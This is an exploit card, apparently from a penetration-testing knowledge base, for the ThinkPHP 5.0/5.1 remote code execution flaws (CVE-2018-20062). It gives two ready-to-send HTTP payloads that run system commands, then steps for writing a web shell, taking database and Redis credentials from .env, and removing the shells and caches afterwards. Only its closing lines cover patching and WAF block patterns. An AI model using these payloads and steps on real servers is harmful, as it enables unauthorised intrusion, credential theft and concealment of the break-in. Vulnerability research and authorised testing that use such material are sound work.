---
title: ThinkPHP 5.x method injection / routing RCE
cve: CVE-2018-20062 (related CVE-2019-9082 and others)
severity: critical
cvss: 9.8
product: ThinkPHP 5.0.x / 5.1.x
versions: 5.0.5 - 5.0.23, 5.1.0 - 5.1.30 (unpatched)
ports: 80, 443
keywords: thinkphp, invokefunction, _method, __construct, filter, rce
verified: false
sources: NVD / vendor advisories / public analyses (see references below)
---

## Fingerprinting

- `ThinkPHP` on error pages; `X-Powered-By: ThinkPHP`; routing format `/index.php?s=...`.

## Prerequisites

- Debug enabled or routes accessible; unpatched 5.0/5.1.

## PoC

5.0 routing variant:

```http
POST /index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id HTTP/1.1
Host: target
Content-Length: 0
```

5.1 method injection variant:

```http
POST /index.php?s=index/index/index HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: 55

_method=__construct&filter[]=system&method=get&get[]=id
```

## Exploitation Steps

1. Try both variants (`invokefunction` for 5.0, `_method=__construct` for 5.1); returned output confirms RCE.
2. If no output is returned, try combinations using `filter[]=assert` and `filter[]=call_user_func`, or use `vars[0]=file_put_contents` to write a web shell to `public/`.
3. Write a file: place `shell.php` alongside `public/index.php`; ThinkPHP entry-point files are often writable.
4. Privilege escalation: read `.env` for DB/Redis credentials; ThinkPHP often uses Redis for caching, and unauthenticated Redis access is common.
5. Cleanup: delete `runtime/` caches and written web shells; check for suspicious files under `application/`.

## Remediation and Mitigation

- Upgrade to 5.0.24 / 5.1.31 or later (or migrate to 6.x); disable `app_debug`.
- Temporary mitigation: block `invokefunction`, `_method=__construct`, and `filter[]=` at the WAF.

## References

- NVD CVE-2018-20062; ThinkPHP security advisory; related CVE-2019-9082.
